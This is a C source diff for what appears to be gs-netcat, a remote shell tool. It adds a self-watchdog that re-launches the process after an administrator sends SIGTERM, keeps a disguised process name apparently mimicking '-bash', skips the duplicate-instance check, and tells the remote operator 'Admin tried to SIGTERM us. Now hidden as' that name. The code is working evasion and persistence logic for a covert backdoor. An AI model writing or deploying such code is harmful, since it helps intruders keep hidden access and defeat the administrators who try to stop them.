@@ -262,15 +262,25 @@ is_running(void) {
 		if (mycmd_sz > 0) {
 			cmd_sz = read_proc_cmd(cmd, sizeof cmd, pid);
 			if (cmd_sz > 0) {
-				if (cmd_sz != mycmd_sz)
-					continue;
-				if (memcmp(cmd, mycmd, cmd_sz) != 0)
+				// Check if this is either or:
+				// 1. Our argv[0]
+				// 2. The argv[0] only used if SWD received a SIGTERM.
+				int is_match = 0;
+				if (cmd_sz == mycmd_sz) {
+					if (memcmp(cmd, mycmd, cmd_sz) == 0)
+						is_match = 1;
+				}
+				if (cmd_sz == strlen(GSNC_PROC_HN_SIGTERM) + 1) {
+					if (memcmp(cmd, GSNC_PROC_HN_SIGTERM, cmd_sz) == 0)
+						is_match = 1;
+				}
+				if (!is_match)
 					continue;
 			}
 		}
 
 		if ((exe_sz == 0) && (cmd_sz == 0))
-			continue; // Could nto read_proc_*() from this pid. continue.
+			continue; // Could not read_proc_*() from this pid. continue.
 
 		DEBUGF("%zd (%s), %zd (%s)\n", exe_sz, exe, cmd_sz, cmd);
 		fret = 0;
@@ -279,7 +289,7 @@ is_running(void) {
 
 	closedir(d);
 err:
-	DEBUGF("returns %d [%s]\n", fret, 0?"already running":"NOT running");
+	DEBUGF("returns %d [%s]\n", fret, fret==0?"already running":"NOT running");
 	return fret;
 }
 
@@ -300,8 +310,13 @@ changeargv0_finish(void) {
 	unsetenv("_GS_FS_EXENAME");
 	unsetenv("_GS_PROC_EXENAME");
 
-	if (is_running() == 0)
-		exit(0);
+	if (!(gopt.flags & GSC_FL_STARTED_BY_SWD)) {
+		if (is_running() == 0)
+			exit(0);
+	}
+
+	if (strcmp(gopt.prg_name, GSNC_PROC_HN_SIGTERM) == 0)
+		gopt.flags |= GSC_FL_SWD_SURVIVED_SIGTERM;
 
 	DEBUGF("Now hidden as prg_name=%s [orig EXENAME=%s]\n", gopt.prg_name, gopt.prg_exename);
 	// SEAL after config had been read.
@@ -383,7 +398,6 @@ try_changeargv0(int argc, char *argv[]) {
 			fs_exename = realpath(argv[0], NULL /* malloc */);
 	}
 
-
 	if (myself_exe == NULL)
 		myself_exe = fs_exename;
 	DEBUGF("fs_Exename='%s' config_exe='%s'\n", fs_exename, myself_exe);
@@ -408,6 +422,12 @@ try_changeargv0(int argc, char *argv[]) {
 	if (gopt.proc_hiddenname == NULL) {
 		DEBUGF("Config has no PROC_HIDDENNAME.\n");
 		return; // Dont want to change argv0
+	}
+
+	if (gopt.flags & GSC_FL_STARTED_BY_SWD) {
+		// Keep the argv that the watchdog gave us. Might be '-bash' if we received
+		// a SIGTERM.
+		gopt.proc_hiddenname = strdup(argv[0]);
 	}
 
 	setenv("_GS_PROC_EXENAME", myself_exe, 1);
@@ -512,6 +532,9 @@ init_defaults1(int argc, char *argv[]) {
 	}
 	gopt.prg_name = strdup(gopt.prg_name?:"NULL");
 
+    if (getenv("_GS_SWD") != NULL)
+		gopt.flags |= GSC_FL_STARTED_BY_SWD;
+
 	ptr = GS_GETENV2("CONFIG_READ");
     if ((ptr == NULL) || (*ptr != '0'))
 		gopt.flags |= GSC_FL_WANT_CONFIG_READ;
@@ -520,10 +543,12 @@ init_defaults1(int argc, char *argv[]) {
 		return;
 	}
 
-
 	try_changeargv0(argc, argv); // If wanted, calls GSNC_config_read()
 	if (gopt.flags & GSC_FL_CONFIG_CHECK)
 		return;
+
+	if (gopt.flags & GSC_FL_STARTED_BY_SWD)
+		return; // RETURN if re-exec by self-watchdog.
 
 	// 1. CCG MUST be done before any fork() so that cgroup-change completes
 	// before returning control back to ExecStart
@@ -600,9 +625,10 @@ gs_create(void)
 }
 
 static void
-cb_sigterm(int sig)
-{
+cb_sigterm(int sig) {
+	DEBUGF("SIGTERM received\n");
 	sv_sigforward(sig);
+	gopt.exit_code = EX_SIGTERM;
 	exit(EX_SIGTERM);	// will call cb_atexit()
 }
 
@@ -725,6 +751,8 @@ init_vars(void)
 		// by GS_ARGS (and thus known to user)
 		if (gs_args != NULL)
 			gopt.is_greetings = 0;
+		
+		gopt.flags |= GSC_FL_SELF_WATCHDOG;
 
 		// do not allow execution without supplied secret.
 		if ((gs_args == NULL) && (is_sec_by_prompt)) {
@@ -759,7 +787,9 @@ init_vars(void)
 	if ((gopt.is_interactive && !(gopt.flags & GSC_FL_IS_SERVER) && !gopt.is_stdin_a_tty))
 		gopt.is_stdin_ignore_eof = 1;
 
+	DEBUGF("MARK foobar before signal()\n");
 	signal(SIGTERM, cb_sigterm);
+	DEBUGF("After signal(), swd=%d\n", gopt.flags & GSC_FL_STARTED_BY_SWD);
 }
 
 void
@@ -842,7 +872,14 @@ getcwdx(void)
 #endif
 }
 
-
+void
+open_logfile(const char *fn) {
+	gopt.is_logfile = 1;
+	gopt.log_fp = fopen(fn, "a");
+	if (gopt.log_fp == NULL)
+		ERREXIT("fopen(%s): %s\n", fn, strerror(errno));
+	gopt.err_fp = gopt.log_fp;
+}
 
 void
 do_getopt(int argc, char *argv[])
@@ -859,11 +896,8 @@ do_getopt(int argc, char *argv[])
 				gopt.flags &= ~GSC_FL_OPT_QUIET;
 				break;
 			case 'L':
-				gopt.is_logfile = 1;
-				gopt.log_fp = fopen(optarg, "a");
-				if (gopt.log_fp == NULL)
-					ERREXIT("fopen(%s): %s\n", optarg, strerror(errno));
-				gopt.err_fp = gopt.log_fp;
+				if (GS_GETENV2("LOGFILE") == NULL)
+					open_logfile(optarg);
 				break;
 			case 'T':
 				gopt.flags |= GSC_FL_OPT_TOR;
@@ -1423,8 +1457,7 @@ try_doublefork(void) {
 	signal(SIGHUP, SIG_IGN);
 	pid = fork();
 	if (pid > 0) {
-		gopt.flags |= GSC_FL_IS_NO_ATEXIT;
-		exit(0);
+		_exit(0); // dont call cb_atexit().
 	}
 	// HERE: Child
 	signal(SIGHUP, SIG_DFL);
@@ -1664,6 +1697,11 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	envp[envplen++] = "LANG=en_US.UTF-8";
 	envp[envplen++] = "GS_CONFIG_READ=0";
 
+	if (gopt.flags & GSC_FL_IS_STEALTH) {
+		if (gopt.flags & GSC_FL_SWD_SURVIVED_SIGTERM)
+			printf("="CDR"WARNING"CN"        : Admin tried to SIGTERM us. Now hidden as "CDY GSNC_PROC_HN_SIGTERM CN"\n");
+	}
+
 	char *ptr = gopt.prg_exename;
 	if (ptr == NULL) {
 		printf("="CDR"WARNING"CN"        : GSNC is not installed permanently (will not survive a reboot)\n");
@@ -1672,8 +1710,9 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 		if (stat(ptr, &sb) != 0) {
 			printf("="CDR"WARNING"CN"        : GSNC has been removed: "CDY"%s"CN"\n", ptr);
 			ptr = NULL;
-		} 
+		}
 	}
+
 	if (ptr == NULL) {
 		char procpidexe[64];
 		snprintf(procpidexe, sizeof procpidexe, "/proc/%d/exe", getpid());
